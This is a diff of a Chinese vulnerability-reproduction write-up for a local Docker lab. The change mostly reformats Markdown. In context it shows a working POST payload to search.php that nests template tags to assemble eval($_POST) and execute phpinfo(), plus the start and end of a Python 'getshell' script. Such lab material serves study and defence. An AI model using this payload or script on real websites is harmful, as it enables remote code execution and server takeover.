@@ -10,13 +10,15 @@ docker-compose up -d
 ### Payload
 
 url:http://127.0.0.1:8002/search.php
+
 POST: searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&ver=OST[9]))&9[]=ph&9[]=pinfo();
 
 ![](luffy1.png)
 
 
 getshell脚本
-`
+
+```
 import sys
 import requests
 import threading
@@ -64,13 +66,16 @@ def main():
 
 if __name__ == '__main__':
     main()
-`
+```
 
 ![](luffy2.png)
 
 
+
 ## 漏洞连接
+
 [链接一](https://bbs.ichunqiu.com/thread-35140-1-5.html)
+
 [链接二](https://www.cnblogs.com/sqyysec/p/7765703.html)
 
 
